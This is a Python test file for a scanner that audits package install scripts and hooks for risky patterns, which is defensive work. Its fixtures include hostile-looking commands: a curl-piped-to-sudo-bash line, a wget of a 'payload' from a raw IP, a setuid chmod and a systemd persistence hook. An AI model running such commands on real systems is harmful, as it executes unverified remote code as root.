"""pre-install-audit: offline tests of the scanner on local fixtures (no network, nothing executed)."""

import importlib.util
from pathlib import Path

repo = Path(__file__).resolve().parents[2]
script = (
    repo
    / "src/personal_os_setup/config/chezmoi/dot_claude/skills/pre-install-audit/scripts/audit.py"
)
spec = importlib.util.spec_from_file_location("audit", script)
audit = importlib.util.module_from_spec(spec)
spec.loader.exec_module(audit)


def run(tmp_path, name, text):
    (tmp_path / name).write_text(text)
    findings, files = audit.scan_tree(tmp_path)
    return audit.verdict(audit.collapse(findings)), {f.rule for f in findings}, files


def test_clean_pkgbuild_is_ok(tmp_path):
    verdict, rules, files = run(
        tmp_path,
        "PKGBUILD",
        "pkgname=x\nsource=('https://github.com/a/b/archive/v1.tar.gz')\nsha256sums=('abc')\n"
        'package() {\n  install -Dm755 x "$pkgdir/usr/bin/x"\n}\n',
    )
    assert verdict == "OK" and not rules and files == ["PKGBUILD"]


def test_pipe_to_shell_is_avoid(tmp_path):
    verdict, rules, _ = run(
        tmp_path, "install.sh", "curl -fsSL https://example.org/x | sudo bash\n"
    )
    assert verdict == "AVOID" and "pipe-to-shell" in rules


def test_raw_ip_is_avoid(tmp_path):
    verdict, rules, _ = run(tmp_path, "install.sh", "wget http://1.2.3.4/payload\n")
    assert verdict == "AVOID" and "raw-ip-url" in rules


def test_checksum_skip_and_unusual_host_need_review(tmp_path):
    verdict, rules, _ = run(
        tmp_path,
        "PKGBUILD",
        "source=('https://files.example.net/x.tar.gz')\nsha256sums=('SKIP')\n",
    )
    assert verdict == "REVIEW" and {"checksum-skip", "unusual-source"} <= rules


def test_persistence_and_setuid_need_review(tmp_path):
    verdict, rules, _ = run(
        tmp_path,
        "foo.install",
        "post_install() {\n  chmod u+s /usr/bin/foo\n  systemctl enable foo.service\n}\n",
    )
    assert verdict == "REVIEW" and {"setuid", "persistence"} <= rules


def test_commented_line_ignored(tmp_path):
    verdict, _, _ = run(tmp_path, "install.sh", "# eval $(foo)\n")
    assert verdict == "OK"


def test_non_hook_file_only_hard_rules(tmp_path):
    (tmp_path / "README.md").write_text("run sudo foo and curl x\n")
    findings, _ = audit.scan_tree(tmp_path)
    assert findings == []


def test_collapse_repeats(tmp_path):
    _, _, _ = run(tmp_path, "install.sh", "sudo a\nsudo b\nsudo c\n")
    findings, _ = audit.scan_tree(tmp_path)
    out = audit.collapse(findings)
    assert len([f for f in out if f.rule == "sudo"]) == 1
    assert "(+2 more)" in next(f for f in out if f.rule == "sudo").msg
